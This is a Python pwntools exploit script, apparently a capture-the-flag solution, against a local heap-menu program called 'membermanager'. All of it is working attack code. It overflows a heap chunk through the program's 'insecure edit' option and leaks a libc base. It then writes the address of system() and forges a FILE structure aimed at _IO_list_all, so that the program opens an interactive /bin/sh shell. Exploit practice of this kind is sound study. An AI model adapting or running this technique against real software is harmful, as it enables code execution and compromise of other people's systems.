#!/usr/bin/python3
from pwn import process, p64, p16, gdb

shell = process("./membermanager")

def add(size, data):
    shell.sendlineafter(b"6. exit", b"1")
    shell.sendlineafter(b"size:", str(size).encode())
    shell.sendlineafter(b"username:", data)

def edit(index, mode, data):
    shell.sendline(b"2")
    shell.sendlineafter(b"2. insecure edit", str(mode).encode())
    shell.sendlineafter(b"index:", str(index).encode())
    shell.sendlineafter(b"username:", data)
    shell.recvuntil(b"6. exit")

def ban(index):
    shell.sendline(b"3")
    shell.sendlineafter(b"index:", str(index).encode())
    shell.recvuntil(b"6. exit")

def change(data):
    shell.sendline(b"4")
    shell.sendlineafter(b"name:", data)
    shell.recvuntil(b"6. exit")

shell.sendlineafter(b"name:", b"")

add(0x88, b"A" * 0x88)
add(0x100, b"B" * 8)

payload  = b"A" * 0x160
payload += p64(0)
payload += p64(0x21)

add(0x500, payload)
add(0x88, b"A" * 8)

shell.recvline()
ban(2)

payload  = b""
payload += b"A" * 0x88
payload += p16(0x280)

edit(0, 2, payload)

shell.recv()
shell.sendline(b"5")
shell.recvline()

libc_base = int(shell.recvline().strip(), 10) - 0xf7250

payload  = b""
payload += p64(0x0) * 3
payload += p64(libc_base + 0x45390) # system()

change(payload)

payload  = b""
payload += b"A" * 0x100
payload += b"/bin/sh\x00"
payload += p64(0x61)
payload += p64(0)
payload += p64(libc_base + 0x3c5520 - 0x10) # list_all
payload += p64(2)
payload += p64(3)
payload += p64(0) * 21
payload += p64(0x6020a0)

edit(1, 1, payload)

shell.sendline(b"1")
shell.sendlineafter(b"size:", str(0x80).encode())
shell.recvline_contains(b"***")
shell.interactive()
